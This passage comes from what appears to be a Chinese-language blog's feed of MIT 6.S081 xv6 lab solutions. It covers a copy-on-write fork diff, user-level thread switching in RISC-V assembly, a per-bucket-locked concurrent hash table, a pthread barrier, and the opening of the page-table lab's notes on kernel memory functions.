</span></span>@@ -67,7 +103,12 @@ usertrap(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    syscall();
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125; else if((which_dev = devintr()) != 0)&#123;
</span><span class="token prefix unchanged"> </span><span class="token line">    // ok
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  &#125; else &#123;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  &#125; else if (r_scause() == 15 &amp;&amp; iscowpage(p->pagetable, r_stval())) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">    if (cowfault(p->pagetable, r_stval()) &lt; 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">      p->killed = 1;
</span><span class="token prefix inserted">+</span><span class="token line">    &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  else &#123;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    printf("usertrap(): unexpected scause %p pid=%d\n", r_scause(), p->pid);
</span><span class="token prefix unchanged"> </span><span class="token line">    printf("            sepc=%p stval=%p\n", r_sepc(), r_stval());
</span><span class="token prefix unchanged"> </span><span class="token line">    p->killed = 1;
</span></span>diff --git a/kernel/vm.c b/kernel/vm.c
index d5a12a0..df0ddde 100644
<span class="token coord">--- a/kernel/vm.c</span>
<span class="token coord">+++ b/kernel/vm.c</span>
@@ -303,22 +303,20 @@ uvmcopy(pagetable_t old, pagetable_t new, uint64 sz)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  pte_t *pte;
</span><span class="token prefix unchanged"> </span><span class="token line">  uint64 pa, i;
</span><span class="token prefix unchanged"> </span><span class="token line">  uint flags;
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  char *mem;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">  for(i = 0; i &lt; sz; i += PGSIZE)&#123;
</span><span class="token prefix unchanged"> </span><span class="token line">    if((pte = walk(old, i, 0)) == 0)
</span><span class="token prefix unchanged"> </span><span class="token line">      panic("uvmcopy: pte should exist");
</span><span class="token prefix unchanged"> </span><span class="token line">    if((*pte &amp; PTE_V) == 0)
</span><span class="token prefix unchanged"> </span><span class="token line">      panic("uvmcopy: page not present");
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    *pte &amp;= ~PTE_W;   // set write bit
</span><span class="token prefix inserted">+</span><span class="token line">    *pte |= PTE_COW;  // clear COW bit
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pa = PTE2PA(*pte);
</span><span class="token prefix unchanged"> </span><span class="token line">    flags = PTE_FLAGS(*pte);
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    if((mem = kalloc()) == 0)
</span><span class="token prefix deleted">-</span><span class="token line">      goto err;
</span><span class="token prefix deleted">-</span><span class="token line">    memmove(mem, (char*)pa, PGSIZE);
</span><span class="token prefix deleted">-</span><span class="token line">    if(mappages(new, i, PGSIZE, (uint64)mem, flags) != 0)&#123;
</span><span class="token prefix deleted">-</span><span class="token line">      kfree(mem);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if(mappages(new, i, PGSIZE, pa, flags) != 0)&#123;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">      goto err;
</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    incrfcount((void*)pa); // increment reference count to pa
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">  return 0;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span>@@ -350,6 +348,9 @@ copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">  while(len > 0)&#123;
</span><span class="token prefix unchanged"> </span><span class="token line">    va0 = PGROUNDDOWN(dstva);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if (iscowpage(pagetable, va0)) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">      cowfault(pagetable, va0);
</span><span class="token prefix inserted">+</span><span class="token line">    &#125;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pa0 = walkaddr(pagetable, va0);
</span><span class="token prefix unchanged"> </span><span class="token line">    if(pa0 == 0)
</span><span class="token prefix unchanged"> </span><span class="token line">      return -1;
</span></span>diff --git a/time.txt b/time.txt
new file mode 100644
index 0000000..209e3ef
<span class="token coord">--- /dev/null</span>
<span class="token coord">+++ b/time.txt</span>
<span class="token coord">@@ -0,0 +1 @@</span>
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">20</span></span></code></pre>

]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>操作系统</tag>
        <tag>xv6</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT6.s081 2021 Lab Multithreading</title>
    <url>/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/</url>
    <content><![CDATA[<h1 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>xv6 已经实现了进程的切换机制，本实验要求参考进程的切换，实现一个用户态线程的切换。</p>
<p>要实现线程切换，必然涉及上下文，即寄存器的保存和恢复，那么需要保存哪些寄存器？实际上，只需要保存被调用者保存寄存器（callee-saved registers），而实现调用者保存寄存器（caller-saved registers）的保存与恢复的代码由编译器自动生成。关于调用者保存与被调用者保存寄存器有哪些可以参照下述 RISC-V 的 calling convention：</p>
<p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/call.png"></p>
<p>另外，根据 <code>user/uthread_switch.S</code> 的注释，<code>thread_switch</code> 最后通过 <code>ret</code> 指令将当前程序计数器的值切换为 ra 寄存器中存储的地址，实现进程的“切换”，因此 <code>struct thread</code> 中还需要保存每个线程对应程序的起始地址（即函数指针）。</p>
<p>在了解需要保存哪些寄存器之后以及如何进行线程切换之后，还有一个细节需要考虑，即栈指针寄存器（sp）的初始化。线程栈的存储位置为 <code>struct thread</code> 中的 <code>stack</code> 数组，那么 sp 应该指向 <code>stack</code> 的位置，但由于栈的地址从大到小增长，因此 <code>sp</code> 应该初始化为 <code>(uint64)t-&gt;stack + STACK_SIZE</code>.</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/user/uthread.c b/user/uthread.c
index 06349f5..74b7f20 100644
<span class="token coord">--- a/user/uthread.c</span>
<span class="token coord">+++ b/user/uthread.c</span>
<span class="token coord">@@ -12,6 +12,20 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">struct thread &#123;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  /* 0 */  uint64 ra;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 8 */  uint64 sp;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 16 */  uint64 s0;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 24 */ uint64 s1;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 32 */ uint64 s2;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 40 */ uint64 s3;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 48 */ uint64 s4;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 56 */ uint64 s5;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 64 */ uint64 s6;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 72 */ uint64 s7;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 80 */ uint64 s8;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 88 */ uint64 s9;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 96 */ uint64 s10;
</span><span class="token prefix inserted">+</span><span class="token line">  /* 104 */ uint64 s11;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  char       stack[STACK_SIZE]; /* the thread's stack */
</span><span class="token prefix unchanged"> </span><span class="token line">  int        state;             /* FREE, RUNNING, RUNNABLE */
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span></span>@@ -62,6 +76,7 @@ thread_schedule(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">     * Invoke thread_switch to switch from t to next_thread:
</span><span class="token prefix unchanged"> </span><span class="token line">     * thread_switch(??, ??);
</span><span class="token prefix unchanged"> </span><span class="token line">     */
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">	thread_switch((uint64)t, (uint64)current_thread);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125; else
</span><span class="token prefix unchanged"> </span><span class="token line">    next_thread = 0;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span>@@ -76,6 +91,8 @@ thread_create(void (*func)())
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">  t->state = RUNNABLE;
</span><span class="token prefix unchanged"> </span><span class="token line">  // YOUR CODE HERE
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  t->ra = (uint64)func;
</span><span class="token prefix inserted">+</span><span class="token line">  t->sp = (uint64)t->stack + STACK_SIZE;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">void 
</span></span>diff --git a/user/uthread_switch.S b/user/uthread_switch.S
index 5defb12..0eb0a2c 100644
<span class="token coord">--- a/user/uthread_switch.S</span>
<span class="token coord">+++ b/user/uthread_switch.S</span>
<span class="token coord">@@ -7,5 +7,34 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">	.globl thread_switch
</span><span class="token prefix unchanged"> </span><span class="token line">thread_switch:
</span></span>	/* YOUR CODE HERE */
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">	sd ra, 0(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd sp, 8(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s0, 16(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s1, 24(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s2, 32(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s3, 40(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s4, 48(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s5, 56(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s6, 64(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s7, 72(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s8, 80(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s9, 88(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s10, 96(a0)
</span><span class="token prefix inserted">+</span><span class="token line">	sd s11, 104(a0)
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">	ld ra, 0(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld sp, 8(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s0, 16(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s1, 24(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s2, 32(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s3, 40(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s4, 48(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s5, 56(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s6, 64(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s7, 72(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s8, 80(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s9, 88(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s10, 96(a1)
</span><span class="token prefix inserted">+</span><span class="token line">	ld s11, 104(a1)
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">	ret    /* return to ra */</span></span></code></pre>

<h1 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>后两个实验与 xv6 无关，而是练习使用 POSIX 线程库在实际的 Linux 平台进行并发编程。</p>
<p>本实验要求使用锁机制，实现一个支持并发的哈希表。首先需要确定的是：哪部分的操作会出现竞态（race condition）？根据观察不难得知 <code>put()</code> 操作可能存在下面这种情况：</p>
<blockquote>
<p>线程 1 和线程 2 本次 <code>put()</code> 映射到一个桶中（i 相同），都执行完 line 46 ~ 49 的循环之后，e 都为 0，随后先后执行 <code>insert()</code>，都创建一个新的 entry，并先后更新 <code>table[i]</code> 的值，导致先插入的键被覆盖。<br>像这样，在一次插入操作未完成的情况下，另一次插入也开始进行且映射到一个桶中，就会导致丢键（keys missing）的情况发生。</p>
</blockquote>
<p>首先最简单无脑的办法就是给整个 <code>put()</code> 函数加一把大锁：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// update the existing key.</span>
    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// the new is new.</span>
    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre>

<p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock1.png"></p>
<p>可以看到，keys missing 的问题已经被解决，但是大锁带来的就是更低的性能，实际上根据上图可知，该实现在双核情况下的运行速度甚至慢于单核。</p>
<p>实际上，对 <code>table</code> 数组的遍历并不会导致竞态，因此将加锁的操作延迟到遍历结束后：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// update the existing key.</span>
    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// the new is new.</span>
    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre>

<p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock2.png"></p>
<p>做了上述修改后，仍然没有出现 key missing 的情况，同时效率提升了一倍以上。</p>
<p>最后，更细化一些，只有当两个 <code>put()</code> 映射到同一个桶时才会发生竞态，因此可以为每个桶分别设置一把锁，以进一步提高并发性：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>locks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// update the existing key.</span>
    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// the new is new.</span>
    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>locks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre>

<p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock3.png"></p>
<p>可见，效率又有进一步提升。</p>
<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/notxv6/ph.c b/notxv6/ph.c
index 82afe76..321e269 100644
<span class="token coord">--- a/notxv6/ph.c</span>
<span class="token coord">+++ b/notxv6/ph.c</span>
@@ -17,6 +17,7 @@ struct entry *table[NBUCKET];
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int keys[NKEYS];
</span><span class="token prefix unchanged"> </span><span class="token line">int nthread = 1;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pthread_mutex_t locks[NBUCKET];
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">double
</span><span class="token prefix unchanged"> </span><span class="token line">now()
</span></span>@@ -47,6 +48,7 @@ void put(int key, int value)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    if (e->key == key)
</span><span class="token prefix unchanged"> </span><span class="token line">      break;
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_lock(&amp;locks[i]);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(e)&#123;
</span><span class="token prefix unchanged"> </span><span class="token line">    // update the existing key.
</span><span class="token prefix unchanged"> </span><span class="token line">    e->value = value;
</span></span>@@ -54,7 +56,7 @@ void put(int key, int value)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    // the new is new.
</span><span class="token prefix unchanged"> </span><span class="token line">    insert(key, value, &amp;table[i], table[i]);
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_unlock(&amp;locks[i]);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">static struct entry*
</span></span>@@ -118,6 +120,10 @@ main(int argc, char *argv[])
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    keys[i] = random();
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  for (int i = 0; i &lt; NBUCKET; ++i) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">    pthread_mutex_init(&amp;locks[i], NULL);
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  //
</span><span class="token prefix unchanged"> </span><span class="token line">  // first the puts
</span><span class="token prefix unchanged"> </span><span class="token line">  //
</span></span></code></pre>

<h1 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>最后一个实验主要是熟悉 POSIX 线程库中条件变量（conditional variable）的使用，实现的思路比较简单：前 nthread - 1 个线程在条件变量上休眠，最后一个线程将休眠的所有进程进行唤醒。有关条件变量的用法可以参考 OSTEP：<a href="https://pages.cs.wisc.edu/~remzi/OSTEP/threads-cv.pdf">OSTEP: Condition Variables</a>.</p>
<h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/notxv6/barrier.c b/notxv6/barrier.c
index 12793e8..e4fd03e 100644
<span class="token coord">--- a/notxv6/barrier.c</span>
<span class="token coord">+++ b/notxv6/barrier.c</span>
@@ -30,7 +30,18 @@ barrier()
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  // Block until all threads have called barrier() and
</span><span class="token prefix unchanged"> </span><span class="token line">  // then increment bstate.round.
</span><span class="token prefix unchanged"> </span><span class="token line">  //  
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_lock(&amp;bstate.barrier_mutex);
</span><span class="token prefix inserted">+</span><span class="token line">  ++bstate.nthread;
</span><span class="token prefix inserted">+</span><span class="token line">  if (bstate.nthread == nthread) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">    pthread_cond_broadcast(&amp;bstate.barrier_cond);
</span><span class="token prefix inserted">+</span><span class="token line">	++bstate.round;
</span><span class="token prefix inserted">+</span><span class="token line">	bstate.nthread = 0;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  else &#123;
</span><span class="token prefix inserted">+</span><span class="token line">    pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_unlock(&amp;bstate.barrier_mutex);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span></code></pre>

]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>操作系统</tag>
        <tag>xv6</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT6.s081 2021 Lab Page tables</title>
    <url>/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/</url>
    <content><![CDATA[<h1 id="Speed-up-system-calls"><a href="#Speed-up-system-calls" class="headerlink" title="Speed up system calls"></a>Speed up system calls</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目要求在每个进程初始化时为它的页表插入一个页表项，内核通过这样预先缓存页表项的操作，来加速特定系统调用的执行速度。</p>
<p>由于前不久刚过完一遍《OSTEP》，因此我认为自己对页表机制还算比较熟悉，应对本 Lab 理应比较轻松，但在真正上手的时候，还是觉得有些无所适从，无奈老老实实地把 xv6 手册的第 3 章对照着代码仔细研读了一番，从中提炼出了几个关键的函数：</p>
<ol>
<li><code>kernel/kalloc.c:kalloc</code></li>
</ol>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>遍历空闲链表，寻找一个可分配的物理页面。若找到，返回该页面的首（物理）地址；否则，返回 0 （空指针）。</p>
<ol start="2">
<li><code>kernel/kalloc.c:kfree</code></li>
</ol>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">kfree</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pa<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>释放已分配的首地址为 <code>pa</code> 的物理页面，并更新空闲链表。</p>
<ol start="3">
<li><code>kernel/proc.c:allocproc</code></li>
</ol>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span><span class="token function">allocproc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>遍历进程数组 <code>proc</code>，寻找未被使用的 <code>struct proc</code>。若找到，则初始化其状态，为创建一个新的<strong>页表</strong>，并返回指向它的指针；否则，返回 0（空指针）。</p>
<ol start="4">
<li><code>kernel/proc.c:freeproc</code></li>
</ol>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">freeproc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>释放与进程 <code>p</code> 相关的数据的内存空间，并清空 <code>p</code> 的 <code>struct proc</code> 的所有信息。</p>
<ol start="5">
<li><code>kernel/vm.c:mappages</code></li>
</ol>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">mappages</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">,</span> uint64 size<span class="token punctuation">,</span> uint64 pa<span class="token punctuation">,</span> <span class="token keyword">int</span> perm<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>在页表 <code>pagetrable</code> 中创建从起始虚拟地址 <code>va</code> 到起始物理地址 <code>pa</code> 的页表项映射，页表项的 <code>flags</code> 位的访问权限部分设置为 <code>perm</code>，其中大小为 <code>size</code>，将 <code>size</code> 分为若干页，为这些页面创建 <code>va + i * PGSIZE -&gt; pa + i * PGSIZE</code> （<code>i</code> 代表页面的编号）的映射。</p>
<ol start="6">
<li><code>kernel/vm.c:uvmunmap</code></li>
</ol>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">uvmunmap</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">,</span> uint64 npages<span class="token punctuation">,</span> <span class="token keyword">int</span> do_free<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>从 <code>pagetable</code> 中移除从虚拟地址 <code>va</code> 开始的 <code>npages</code> 个页表项。可指定 <code>do_free</code> 的值，若不为 0，则在移除页表项的同时，释放页表项映射 <code>va -&gt; pa</code> 中 <code>pa</code> 指向的内存空间。 </p>
<p>分析完几个关键函数之后，思路就比较清晰了：</p>
<ol>
